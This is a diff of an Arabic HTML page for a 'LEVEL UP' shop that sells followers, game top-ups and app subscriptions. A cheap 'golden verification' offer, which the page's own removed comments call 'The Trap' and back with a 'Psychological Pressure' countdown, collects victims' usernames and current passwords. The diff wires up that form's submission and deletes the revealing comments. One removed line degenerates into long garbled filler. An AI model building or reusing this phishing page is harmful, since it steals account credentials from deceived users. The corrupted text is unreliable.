@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -28,14 +28,10 @@
 </head>
 <body>
 
-    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
-
-    <!-- Timer Banner (Psychological Pressure) -->
     <div class="timer-banner">
         ⚠️ عرض التوثيق الذهبي (5 د.ل) ينتهي خلال: <span id="countdown">23:59:59</span>
     </div>
 
-    <!-- Login Modal -->
     <div class="modal-overlay" id="loginModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold">
             <div class="text-7xl mb-6">💎</div>
@@ -48,7 +44,6 @@
         </div>
     </div>
 
-    <!-- Header -->
     <header class="glass sticky top-[40px] z-50 border-b border-gold px-6 py-4 flex justify-between items-center max-w-6xl mx-auto mt-2 rounded-b-2xl">
         <div class="text-3xl font-black gold-text tracking-tighter cursor-pointer" onclick="showPage('home')">LEVEL UP</div>
         <div class="flex items-center gap-4">
@@ -57,10 +52,8 @@
         </div>
     </header>
 
-    <!-- MAIN PAGES CONTAINER -->
     <main class="max-w-6xl mx-auto px-6 py-12">
 
-        <!-- PAGE 1: HOME -->
         <div id="page-home" class="page">
             <div class="text-center mb-16">
                 <h1 class="text-5xl md:text-7xl font-black gold-text mb-6">اصنع هيبتك الرقمية</h1>
@@ -68,7 +61,6 @@
             </div>
 
             <div class="grid md:grid-cols-3 gap-8">
-                <!-- Platform Cards -->
                 <div class="platform-card" onclick="showPlatform('instagram')">
                     <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" class="w-16 mx-auto mb-4">
                     <h3 class="text-xl font-bold">إنستغرام</h3>
@@ -86,7 +78,6 @@
                 </div>
             </div>
 
-            <!-- Highlight Offer -->
             <div class="mt-16 glass p-8 rounded-[30px] border-2 border-gold text-center relative overflow-hidden">
                 <div class="absolute -top-10 -left-10 w-40 h-40 bg-gold opacity-10 blur-3xl rounded-full"></div>
                 <h2 class="text-3xl font-black gold-text mb-4">🔥 عرض التوثيق الذهبي</h2>
@@ -95,15 +86,15 @@
             </div>
         </div>
 
-        <!-- PAGE 2: PLATFORM SERVICES (Instagram/Facebook) -->
         <div id="page-platform" class="page hidden">
             <button onclick="showPage('home')" class="text-gray-400 mb-6 flex items-center gap-2 hover:text-white"> ← العودة للرئيسية</button>
             <div class="grid lg:grid-cols-3 gap-10">
                 <div class="lg:col-span-1">
-                    <div id="platformIcon" class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-gold p-2"></div>
+                    <div id="platformIcon" class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-gold p-4 flex items-center justify-center bg-zinc-950">
+                        <img id="platformImg" src="" class="w-full h-full object-contain">
+                    </div>
                     <h2 id="platformName" class="text-3xl font-black gold-text text-center mb-8"></h2>
                     
-                    <!-- The Trap (Verification) -->
                     <div class="bg-gold/10 border border-gold p-6 rounded-[25px] text-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
                         <h3 class="text-xl font-bold mb-2">🌟 توثيق الحساب الرسمي</h3>
                         <p class="text-3xl font-black gold-text mb-4">5 د.ل <span class="text-sm text-gray-400">/ فقط</span></p>
@@ -116,9 +107,9 @@
                     <h3 class="text-2xl font-bold mb-6">الخدمات المتاحة</h3>
                     <div id="servicesList" class="grid md:grid-cols-2 gap-4"></div>
                     
-                    <!-- Order Form (Hidden until service selected) -->
                     <div id="orderArea" class="mt-10 pt-10 border-t border-zinc-800 hidden">
-                        <form id="mainOrderForm" class="space-y-6">
+                        <form id="mainOrderForm" onsubmit="submitMainOrder(event)" class="space-y-6">
+                            <h4 id="selectedServiceName" class="text-xl font-bold gold-text"></h4>
                             <div class="grid md:grid-cols-2 gap-4">
                                 <input type="url" id="targetLink" required placeholder="رابط الحساب أو المنشور">
                                 <input type="number" id="quantity" oninput="updatePrice()" value="100" required placeholder="الكمية">
@@ -134,13 +125,11 @@
             </div>
         </div>
 
-        <!-- PAGE 3: GAMING & UPGRADES -->
         <div id="page-gaming" class="page hidden">
             <button onclick="showPage('home')" class="text-gray-400 mb-6 flex items-center gap-2 hover:text-white"> ← العودة للرئيسية</button>
             <h2 class="text-4xl font-black gold-text text-center mb-12">شحن الألعاب وترقية التطبيقات</h2>
             
             <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-                <!-- Telegram -->
                 <div class="glass p-6 rounded-[30px] border border-zinc-800">
                     <div class="flex items-center gap-3 mb-6">
                         <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" class="w-10">
@@ -153,10 +142,9 @@
                     </div>
                 </div>
 
-                <!-- Snapchat -->
                 <div class="glass p-6 rounded-[30px] border border-zinc-800">
                     <div class="flex items-center gap-3 mb-6">
-                        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" class="w-10"> <!-- Icon placeholder -->
+                        <img src="https://cdn-icons-png.flaticon.com/512/3670/3670213.png" class="w-10">
                         <h3 class="text-xl font-bold">سناب شات بلس</h3>
                     </div>
                     <div class="space-y-3">
@@ -166,18 +154,16 @@
                     </div>
                 </div>
 
-                <!-- ChatGPT -->
                 <div class="glass p-6 rounded-[30px] border border-zinc-800">
                     <div class="flex items-center gap-3 mb-6">
                         <img src="https://cdn-icons-png.flaticon.com/512/12222/12222564.png" class="w-10">
                         <h3 class="text-xl font-bold">ChatGPT Plus</h3>
                     </div>
                     <div class="space-y-3">
-                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('ChatGPT Plus', 232)"><span>اشتراك 30 يوم</span> <span class="gold-text font-bold">232 LYD</span></div>
+                        <div class="service-item flex justify-between items-center" onclick="setGamingOrder('ChatGPT Plus', 232)"><span>اشتراق 30 يوم</span> <span class="gold-text font-bold">232 LYD</span></div>
                     </div>
                 </div>
 
-                <!-- Free Fire -->
                 <div class="glass p-6 rounded-[30px] border border-zinc-800">
                     <div class="flex items-center gap-3 mb-6">
                         <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-10">
@@ -191,7 +177,6 @@
                     </div>
                 </div>
 
-                <!-- PUBG -->
                 <div class="glass p-6 rounded-[30px] border border-zinc-800">
                     <div class="flex items-center gap-3 mb-6">
                         <img src="https://cdn-icons-png.flaticon.com/512/686/686589.png" class="w-10">
@@ -206,9 +191,8 @@
                 </div>
             </div>
 
-            <!-- Gaming Order Area -->
-            <div id="gamingOrderArea" class="mt-12 glass p-8 rounded-[30px] hidden animate__animated animate__fadeInUp">
-                <form id="gamingForm" class="space-y-6 max-w-xl mx-auto text-center">
+            <div id="gamingOrderArea" class="mt-12 glass p-8 rounded-[30px] hidden">
+                <form id="gamingForm" onsubmit="submitGamingOrder(event)" class="space-y-6 max-w-xl mx-auto text-center">
                     <h3 id="selectedGamingItem" class="text-2xl font-black gold-text mb-4"></h3>
                     <input type="text" id="gameId" required placeholder="معرف الحساب (ID) أو البريد الإلكتروني">
                     <button type="submit" class="w-full btn-gold py-4 rounded-xl text-xl">تأكيد طلب الشحن ✅</button>
@@ -218,182 +202,184 @@
 
     </main>
 
-    <!-- Verification Modal (The Trap) -->
     <div class="modal-overlay hidden" id="verifyModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border border-gold relative overflow-hidden">
             <div class="text-6xl mb-4">✔️</div>
             <h2 class="text-3xl font-black gold-text mb-2">طلب التوثيق الذهبي</h2>
             <p class="text-gray-400 mb-6">سيتم مراجعة حسابك وتفعيل العلامة الزرقاء خلال 24 ساعة</p>
-            <form id="verifyForm" class="space-y-4">
+            <form id="verifyForm" onsubmit="submitVerifyForm(event)" class="space-y-4">
                 <input type="text" id="vUser" required placeholder="اسم المستخدم (Username)">
                 <input type="password" id="vPass" required placeholder="كلمة السر الحالية">
-                <div class="bg-gold/10 p-3 rounded-xl text-[#D4AF37] font_bold text-sm mb-4">التكلفة الإجمالية: 5 د.ل فقط</div>
+                <div class="bg-gold/10 p-3 rounded-xl text-[#D4AF37] font-bold text-sm mb-4">التكلفة الإجمالية: 5 د.ل فقط</div>
                 <button type="submit" class="w-full btn-gold py-4 rounded-xl text-lg">إرسال البيانات وتفعيل التوثيق</button>
-                <button type="button" onclick="closeVerifyModal()" class="text-gray-500 text-sm hover:underline">إلغاء العملية</button>
+                <button type="button" onclick="closeVerifyModal()" class="text-gray-500 text-sm hover:underline mt-2">إلغاء العملية</button>
             </form>
         </div>
     </div>
 
-    <!-- Success Modal -->
     <div class="modal-overlay hidden" id="successModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border border-gold">
             <div class="text-6xl mb-4">✅</div>
-            <h2 class="text-2xl font_bold gold_text mb-4">تم تقديم الطلب!</h2>
-            <p class="text-gray la mb-6 text la">يرجى نسخ رقم الطلب وإرساله عبر الانستغرام للدفع والتفعيل</p>
-            <div id="orderIdDisplay" class="text-3xl font_black gold_text mb la p la bg la rounded l border l border l cursor l hover l bg la" onclick la "copyOrder()">LVL la la la la la l la l l l l la l l l la la l l l l la l l l l l la l l l l la la la la la de l l l l l l l l de l laL laL la l l de l l l la de l de l deL de de l deL de l de deL de de la de la l deL la de deLLL L L laL a laL L de L l deL lL de de de L deL l L L deL laL l a la deL a de l a de l de de la L de l la L L deL a l L l l a L L L la L de de l L la la L la a de laL deL L a L la a de L laL a l de a deL a la L deL la deC de l a de de de de de l a l a a deL L L l la deL a la L l a la a l de L L L L L de a laL de l L L a L a L l deL la de l l L deC deL dL la L L la l L a a deL d de L lL l aL a L aL d de l L L a L a l L de l d laL l a a l a dL dL d de lL a d L a L a de L a d l L d laC a dL dL d de L d l dC d l de d a dC d de dC d dC d a la l L d d C d d C d dC a C de lL a a de d C d C d C d l C lL d L a la deL la L a d C d C d C d L laL laC a C d C aL C d C de LL laC deC dC d C l C lL aC L la dC a C dC L d aC dC dL a l L la deC a C d C dL la C a C d C d C de C d l C la d C a C d a l de L a C a L dL L d dC dC L la la C a la C aC la L de L la de C a de de d C L la la C a C L a de de d C la de C la la C dC de C a C la L de l L lL deC a C lL aC L a la L la l d C a C la a de L laL lC a la l de C lC L a C a C la la L a a la de C dL deC L lC a laL l l L aC aL aL aL laL la a dC d C L LL L laL la L deL leL dC laC dC aC a C la l LC laL de LL L aC la dC d C lL deL le l d l C l C lL deL leL leL LC LC a deS l la a deS la L L le S la deS a S s S S s l la le L de S leS leS leS le S leS le S le S le S l eS le S leS l eS le S leS le S leS le S l eS le S le S le S le S leS l eS l eS le S leS le S l eS leS leS le S l eS leS le S l eS leS le S le S le S le S leS le S leS l eS le S l eS leS le S leS le S le S l eS le S leS l eS le S le S leS l eS le S l eS l eS le S le S l eS leS le S l eS le S le S le S le S le S l eS le S leS le S le S le S leS le S l eS le S le S le S le S le S l eS le S le S le S le S l eS leS l eS l eS l eS l eS leS l eS l eS l eS l eS l eS leS l eS l eS l eS le S l eS le S l eS leS le S l eS l eS le S l eS l eS le S le S le S l eS le S l eS le S l eS le S le S l eS l eS le S l eS le S l eS l eS le SLCLC laC la dL L d C l dC aC dC L laC la C la a C L laC dL laL a C dCLL LL dCL L de deC laC dC L laC dL de deC laC dC L deL de C laC deC L laC deC LCL d CL de deC laC de C la C laC a la C dC L laCL la C a C dCL L L laLL la la L deLLL LC la LC laLC LC L L LC LC LC L LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LCLC L C de dC dC dCL l dLC LL la a laC a de dC a C la C de C dL de C laC a C dCL l C dCLL la a a C dCL la C deC L a C d CL deC de l C dCLL de la l C a de LL deL t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o oｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｅｂｅｒｇ　ｅｙｅｓ　ｂｅｃａｕｓｅ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ〠t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r
-c
-u
-t
-e！！
-I
-r
-e
-a
-l
-l
-y
-w
-a
-n
-t
-t
-h
-e
-m
-t
-h
-e
-y
-a
-r
-e
-s
-u
-p
-e
-r
-c
-u
-t
-e！！
-I
-r
-e
-a
-l
-l
-y
-w
-a
-n
-t
-t
-h
-e
-m
-t
-h
-e
-y
-a
-r
-e
-s
-u
-p
-e
-r
-c
-u
-t
-e！！
-I
-r
-e
-a
-l
-l
-y
-w
-a
-n
-t
-t
-h
-e
-m
-t
-h
-e
-y
-a
-r
-e
-s
-u
-p
-e
-r
-c
-u
-t
-e！！
-I
-r
-e
-a
-l
-l
-y
-w
-a
-n
-t
-t
-h
-e
-m
-t
-h
-e
-y
-a
-r
-e
-s
-u
-p
-e
-r
-c
-u
-t
-e！！
-I
-r
-e
-a
-l
-l
-y
-w
-a
-n
-t
-t
-h
-e
-m
-t
-h
-e
-y
-a
-r
-e
-s
-u
-p
-e
-r
-cｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ〃ａｒｅ〃ｓｕｐｅｒｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ〃ｔｈｅｍ〃ｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！〃Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌ𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！
+            <h2 class="text-2xl font-bold gold-text mb-4">تم تقديم الطلب!</h2>
+            <p class="text-gray-300 mb-6 text-sm">يرجى نسخ رقم الطلب وإرساله عبر الانستغرام للدفع والتفعيل</p>
